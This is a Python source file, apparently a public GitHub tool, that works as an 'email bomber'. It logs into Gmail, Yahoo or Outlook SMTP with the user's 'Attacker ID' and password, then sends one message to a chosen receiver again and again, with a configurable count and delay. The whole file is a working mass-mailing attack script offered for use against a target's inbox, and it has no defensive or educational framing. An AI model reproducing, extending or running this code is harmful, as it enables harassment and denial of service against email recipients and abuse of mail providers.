#!/use/bin/env python3
#Coded by Sajjad.
#https://github.com/Cyber-Anonymous

import smtplib
import getpass
import time
import os
import logo
import sys
import requests


White="\033[0;0m"
Red="\033[91m"
Green="\033[92m"
Yellow="\033[93m"
Blue="\033[94m"
Cyan="\033[96m"
Bold="\033[1m"
Clear="\033[0;0;0m"

os.system("clear")

print(logo.logo())
print(" ")
print(" ")
print(" ")
print(" ")

try:
	requests.get("https://www.google.com")
except:
	print("STATUS "+Red+"OFFLINE",Clear)
	try:
		os.system("python3 em-bomber.py")
	except:
		pass
try:
	server=input(Bold+"Mail server: "+Clear).lower()
except KeyboardInterrupt:
	sys.exit("\nCanceled\n")

if server == "gmail":
	port = 587
	
elif server == "yahoo":
	port = 465

elif server == "hotmail" or server == "outlook":
	port = 587
	
else:
	port=input(Bold+"\nPort: "+Clear)
	
if (server=="gmail"):
	try:
		email=smtplib.SMTP("smtp.{}.com".format(server),port)
		email.starttls()
	except Exception as error:
		print("")
		print(error)
		sys.exit("")

elif(server=="yahoo"):
		try:
			email=smtplib.SMTP("smtp.mail.{}.com".format(server),port)
			email.starttls()
		except Exception as error:
				print("")
				print(error)
				print("")
				sys.exit()
else:
	try:
		try:
			email=smtplib.SMTP("smtp.{}.com".format(server),port)
		except:
			email=smtplib.SMTP("smtp.mail.{}.com".format(server),port)
	except Exception as error:
		print("")
		print(error)
		sys.exit("")
			
		
user_email=input(Bold+"\nAttacker ID: "+Clear)
user_password=getpass.getpass(Bold+"\nPassword: "+Clear)
try:
	email.login(user_email,user_password)
except:
	print(Bold+Red+"\nUnable to login.",Clear)
	sys.exit()

receiver_email=input(Bold+"\nReceiver ID: "+Clear)
massage=input(Bold+"\nMassage: "+Clear)

amount=input(Bold+"\nNumber of send emails (defaults [10]): "+Clear)
try:
	amount=int(amount)
except:
	amount=10

wait=input(Bold+"\nTime (second) to send per email (default [5]): "+Clear)
try:
	wait=int(wait)
except:
	wait=5
	
print("")

count=0
failed=0

while (True):
	count+=1
	try:
		time.sleep(wait)
		email.sendmail(user_email,receiver_email,massage)
		print(Bold+"\nSuccesfully sent {}".format(count)+Clear)
	
	except KeyboardInterrupt:
		print("\nCanceled")
		break
		sys.exit()
	except:
		failed+=1
		print(Bold+"\nFailed to send {}".format(failed)+Clear)
		
	if (count==amount):
		try:
			email.quit()
		except:
			pass	
		break
	
print("")
print("")

"""
successfully_sent=count-failed

print(Bold+Green+"\nSuccessfully sent {} .".format(successfully_sent)+Clear)
if (failed==0):
	colour=Green
else:
	colour=Red
print(Bold+colour+"\nFailed to send {} .".format(failed)+Clear)
print(Clear)
"""
